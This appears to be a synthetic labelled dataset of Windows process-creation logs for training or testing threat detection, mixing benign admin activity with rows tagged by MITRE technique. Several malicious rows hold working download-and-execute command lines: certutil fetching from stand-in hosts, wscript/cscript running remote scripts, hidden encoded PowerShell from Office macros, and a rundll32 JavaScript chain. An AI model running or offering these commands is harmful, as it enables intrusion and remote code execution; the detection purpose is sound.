UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-01T10:08:00.195Z,{3520D76F-CAF1-432A-A473-9ED2B3DD7D99},8334,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,54475,CORP\sysadmin,High,0,,,gray_area
2024-07-03T13:57:59.815Z,{456E6732-0C8B-444D-B49F-A5F9C7D44669},64713,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",57407,CORP\analyst02,Medium,0,,,benign
2024-07-03T22:12:45.071Z,{A465A216-FD34-4AE2-873B-163BBA88C90D},4003,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",44336,CORP\netadmin,Medium,0,,,benign
2024-07-01T21:06:33.106Z,{74245DDB-2BA1-4C98-B4ED-5E10B9BCCA68},45924,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://darkops9655.xyz/module346.exe C:\Users\Public\core707.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30225,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-02T16:13:35.332Z,{3D4233D6-D524-4CEC-ADE3-BE7237F733F3},44399,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32350,CORP\sysadmin,High,0,,,benign
2024-07-02T04:30:35.202Z,{84FF6A84-BB6A-4B6C-8144-A40F8F47F9F8},32972,C:\Windows\System32\fontdrvhost.exe,fontdrvhost.exe,C:\Windows\System32\smss.exe,smss.exe,26907,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T23:06:20.437Z,{33F17ADE-ED3F-4A6C-B131-8E99403F36F7},21481,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,44588,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-04T13:23:06.093Z,{D5FC9BE1-3BC2-4492-A4CC-8117A2AF4060},1340,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62797,CORP\sysadmin,High,0,,,benign
2024-07-02T14:32:06.572Z,{9A2BAB32-9AC6-4F5E-B6DE-430A2064AD06},5743,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\pchen\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",33975,CORP\pchen,Medium,0,,,benign
2024-07-05T08:42:52.567Z,{7AA6ED77-9C08-4D69-9F4F-1270D1A2B68B},20620,C:\Windows\explorer.exe,explorer.exe C:\Users\pchen\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",62063,CORP\pchen,Medium,0,,,benign
2024-07-01T13:27:07.632Z,{BE1DE1B5-E8DF-4278-8EDB-3E3BA0594D8F},15856,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",C:\Windows\explorer.exe,C:\Windows\explorer.exe,8909,CORP\jsmith,Medium,0,,,gray_area
2024-07-04T13:17:13.773Z,{2B637E83-C63C-4D5C-B5AC-24D10A3BD776},34577,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,8459,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-05T18:32:05.227Z,{F094D192-63A8-4A2B-8EF5-2E6775EA6728},29307,C:\Windows\System32\winlogon.exe,winlogon.exe,C:\Windows\System32\smss.exe,smss.exe,19991,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T21:13:07.241Z,{7703DE21-91DC-4F46-8797-554848DDA4D5},42478,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,29453,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T21:53:46.862Z,{F02C0592-5EED-496B-8502-07511D2BEBE0},10211,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn5153.top/script923.js,C:\Windows\System32\cmd.exe,cmd.exe /c,16469,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-02T14:52:13.506Z,{C5FEFCDA-4513-4DF9-B67E-2EEDDD718A33},18598,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,22159,CORP\agarwal,Medium,0,,,benign
2024-07-01T16:41:11.040Z,{652D61DF-16C8-49DE-8ABA-A67718DF291F},17236,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,47374,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T10:00:20.252Z,{E6EF2C17-8C8D-47EF-911D-073629F709A7},52489,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,15517,CORP\sysadmin,High,0,,,benign
2024-07-04T23:46:47.900Z,{437D7BA1-7A4A-4BFA-9DB2-1EFFA80E79FE},9257,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb6611860.cab C:\Windows\SoftwareDistribution\Download\update_kb6611860.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,35109,NT AUTHORITY\SYSTEM,System,0,,,gray_area
2024-07-05T03:46:03.861Z,{3FD44378-3482-42EE-9061-534340A80DF7},25443,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb8092498.cab C:\Windows\SoftwareDistribution\Download\update_kb8092498.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,18023,NT AUTHORITY\SYSTEM,System,0,,,gray_area
2024-07-03T11:09:11.161Z,{E21E35A3-6419-4842-AC62-BCE56F59475A},24738,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\dbadmin\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",40454,CORP\dbadmin,Medium,0,,,benign
2024-07-02T10:21:57.402Z,{5997840A-F2E2-456D-A329-29442FBD9891},44052,C:\Program Files\Docker\Docker\resources\bin\docker.exe,docker.exe ps -a,C:\Windows\System32\cmd.exe,cmd.exe,9995,CORP\mjones,Medium,0,,,benign
2024-07-04T06:39:18.710Z,{47449D55-40ED-4A1B-892F-0414DD210345},61062,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,33191,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-03T13:38:44.205Z,{63FE433F-2E6F-4BFB-8C7B-A4075FC15C68},32392,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,21590,CORP\agarwal,Medium,0,,,benign
2024-07-05T10:41:53.420Z,{FA52D96A-9769-4F0D-8A72-80B75BA44945},2471,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",16969,CORP\klee,Medium,0,,,benign
2024-07-05T12:29:40.979Z,{AD7D4C9B-D468-47DC-848B-9769F77DDFBD},10492,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",57902,CORP\analyst02,Low,0,,,benign
2024-07-04T15:02:40.396Z,{6808A20D-8818-452D-AB34-92BD4FCB74E5},65293,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,25464,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T20:43:44.704Z,{17BC1B3D-C560-4CF4-9B13-73AD56C099CB},24758,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document42.docm",7280,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-05T12:20:54.251Z,{3E5DF14E-7C34-47A0-9D2E-B9D5FBCB507A},55442,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",62251,CORP\helpdesk,Medium,0,,,benign
2024-07-03T09:15:12.194Z,{F12C5626-1212-4A3D-8497-AF5D49A34C3F},36146,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",30400,CORP\agarwal,Medium,0,,,benign
2024-07-01T14:28:44.608Z,{4B075786-4BD0-4F29-BA81-DB53C61B5F45},31796,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",20087,CORP\dbadmin,Medium,0,,,benign
2024-07-05T12:44:37.156Z,{FBDD4AF9-43D5-4D94-A268-A71812BDA722},38064,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38149,CORP\sysadmin,High,0,,,benign
2024-07-03T10:00:47.345Z,{AEBA129C-6DDD-4566-A340-9BE99270674F},52823,C:\Windows\System32\cmd.exe,cmd.exe /c tracert 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20334,CORP\admin,High,0,,,benign
2024-07-04T17:38:03.316Z,{5E210C65-5C23-4379-81D2-DFBE2BBBC326},44652,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,49607,CORP\jsmith,Medium,0,,,benign
2024-07-03T13:53:40.987Z,{A13A3E68-F856-43F0-8D90-90B25FE79E66},53423,C:\Users\admin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20135,CORP\admin,High,0,,,benign
2024-07-04T12:00:49.440Z,{27D341C0-1FC8-4A73-A4D0-92BC76ED1F73},53295,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",20196,CORP\helpdesk,Low,0,,,benign
2024-07-03T05:28:02.269Z,{F5D1103E-70A2-4EC3-9FDC-7E5C4ABFA93C},29818,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,31478,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T07:36:26.191Z,{57D79216-DEE5-48ED-9C46-0F8B7547FA21},44540,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,44792,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-02T14:23:57.391Z,{3223D59D-1387-44ED-B2D1-F9F9233AEE7C},30395,C:\Windows\System32\cmd.exe,cmd.exe /c systeminfo,C:\Windows\explorer.exe,C:\Windows\explorer.exe,57991,CORP\itops,High,0,,,benign
2024-07-03T11:24:36.033Z,{87495DAD-6AD8-4D3A-91E7-5DF040A22139},40655,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,11055,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-01T17:43:34.388Z,{4A2DE5F4-FE96-45F3-B4A7-11E66CE87092},59704,C:\Windows\System32\cmd.exe,cmd.exe /c dir C:\Users,C:\Windows\explorer.exe,C:\Windows\explorer.exe,65235,CORP\pchen,Medium,0,,,benign
2024-07-03T10:17:12.959Z,{42477FDD-6395-418D-BB96-823BE4233D0A},58357,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48515,CORP\helpdesk,Medium,0,,,benign
2024-07-05T03:06:46.236Z,{BD04DCEE-433D-4CBA-AA83-472041F99DB1},35842,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,26253,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T13:13:43.649Z,{57993C8D-769A-46E1-ADF2-098837DC5963},56896,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",18300,CORP\pchen,Medium,0,,,benign
2024-07-02T19:53:01.636Z,{3CC087CC-363D-44F9-A245-2168AD05D19A},10986,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16633,CORP\jsmith,Medium,0,,,benign
2024-07-04T19:05:20.727Z,{98EAB616-86CE-4653-A2FA-C595CE2D19A9},35761,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded773.exe C:\Users\Public\encoded9267.txt,C:\Windows\System32\cmd.exe,powershell.exe,29372,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-03T14:46:54.244Z,{DE23CDBF-C6FE-452A-BA95-7E57516F0887},4794,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,17022,CORP\mjones,Medium,0,,,benign
2024-07-04T09:56:29.886Z,{5F975B3D-C3CF-4E96-8E8A-880CDAB41EDB},19501,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51693,CORP\agarwal,Medium,0,,,benign
2024-07-01T05:50:17.598Z,{AB1F101D-2437-4681-837E-9FC5FE6E4B54},8841,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,26939,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T22:34:50.109Z,{34905A69-023C-4A5B-8CCE-0B390F648535},9246,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,32971,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T20:07:56.109Z,{E683C079-8FDB-4D0A-9581-71471D1F6EE6},49655,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",37256,CORP\agarwal,Medium,0,,,benign
2024-07-02T23:02:12.471Z,{AD9D3B62-14A9-438E-872B-E2063F29B6BA},49190,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,51527,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T15:37:15.206Z,{51D02E50-6D05-4E8C-BBAD-2FADEAD15006},20322,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,38318,CORP\sysadmin,High,0,,,gray_area
2024-07-03T03:03:15.429Z,{5A60080A-9305-45B2-9938-1631760BD64D},42874,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,53028,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T14:29:43.529Z,{5F62A831-C04C-4F9C-859C-F790FCAEE1C8},23578,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,9410,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-03T23:52:41.834Z,{3246B0CE-9C6A-4F81-9557-E8EF86CFAFE1},10679,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,16484,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-05T12:05:15.121Z,{3CA5132C-0025-4C86-8606-5212D1C82EE9},37573,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",51098,CORP\jsmith,Medium,0,,,benign
2024-07-04T11:32:51.767Z,{F5B91AF7-7D31-46B9-A905-7B2BAF8BE2E0},45525,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,11484,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-06T02:44:14.314Z,{69CE52A6-CDBE-4A03-8E8B-D9C479039E02},9214,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document91.docm",14752,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-05T17:59:43.926Z,{64FA2CFC-4953-4637-817C-3F8B83474687},54522,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,57861,CORP\itops,High,0,,,gray_area
2024-07-01T21:05:17.453Z,{BE1F1201-95E6-4934-B6A6-6A3347924A71},44380,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,28788,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T13:25:29.790Z,{56390C3E-952D-4A4E-9616-B474906E4085},45535,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39573,CORP\mjones,Medium,0,,,benign
2024-07-05T17:53:31.157Z,{F01CDA28-BE6E-4D25-B560-6F42F04B9210},4572,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,24647,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T09:49:57.461Z,{EE9BE229-2BC8-4DE6-A222-B9ED1294B559},30975,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_7.0.81.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,44152,CORP\admin,High,0,,,benign
2024-07-05T10:55:40.323Z,{7E516020-A97B-419B-95B3-2445A279C4BE},10893,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,29820,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-01T11:48:31.237Z,{F336AABB-6D13-4C7C-A7FE-4F0F02D6F882},5119,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18324,CORP\sysadmin,High,0,,,benign
2024-07-02T00:20:59.101Z,{0711AE00-7CE3-44B9-A398-71632148AB6E},55996,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,47838,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-01T15:40:42.714Z,{62DB4EA6-AE03-42AD-AFEC-F33C9CB51289},24476,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,56712,CORP\itops,High,0,,,benign
2024-07-01T22:03:10.450Z,{75173E33-11A2-4350-93C1-961D0024CA9A},28238,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,32735,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-05T12:54:32.921Z,{3C7AB413-9B55-4684-B087-90D56D1D38FB},45518,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,54423,CORP\itops,High,0,,,benign
2024-07-01T15:09:21.763Z,{3F6009F5-EC47-4680-B177-154CAF6DAF83},6099,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,16597,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T10:55:13.533Z,{50A1A84F-1FD3-41DF-B314-ACC3165661D0},63397,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA="")",C:\Windows\explorer.exe,explorer.exe,42109,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T13:52:08.125Z,{3676B086-8E78-46B5-AF4C-D7D91FEA0E98},56613,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",C:\Windows\explorer.exe,C:\Windows\explorer.exe,14231,CORP\mjones,Medium,0,,,gray_area
2024-07-03T13:22:40.309Z,{C1436F77-5449-406A-8DA6-307046DFF882},16479,C:\Program Files\Git\bin\git.exe,git.exe pull origin main,C:\Windows\System32\cmd.exe,cmd.exe,65110,CORP\jsmith,Medium,0,,,benign
2024-07-03T10:23:30.732Z,{D8F3F73B-74FB-42B1-B877-1ED83CBC5E97},25100,C:\Windows\System32\cscript.exe,cscript.exe //e:vbscript http://beacon-drop6149.net/script434.vbs,C:\Windows\System32\cmd.exe,cmd.exe /c,54829,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-01T15:08:32.425Z,{3BFF5F5D-FA08-4361-81BF-E5FEA394179D},30936,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,37956,CORP\helpdesk,Medium,0,,,benign
2024-07-01T12:50:28.034Z,{702B031B-9680-4801-A81A-49036CD2347E},38982,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",24911,CORP\mjones,Medium,0,,,benign
2024-07-02T14:07:34.230Z,{02C3774D-3AD2-4184-9937-3F2D1391783B},43443,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",10764,CORP\netadmin,Medium,0,,,benign
2024-07-02T12:15:16.674Z,{74453C59-040C-4388-B66B-9A7C43165704},11101,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,47873,CORP\jsmith,Medium,0,,,benign
2024-07-04T00:20:10.820Z,{8449344F-460D-4A6E-BC73-F08A2FEA42EF},63102,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,41509,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T02:27:54.108Z,{54AD491B-5D1E-4B9B-A61F-93CBC17B81F1},16945,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,29552,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
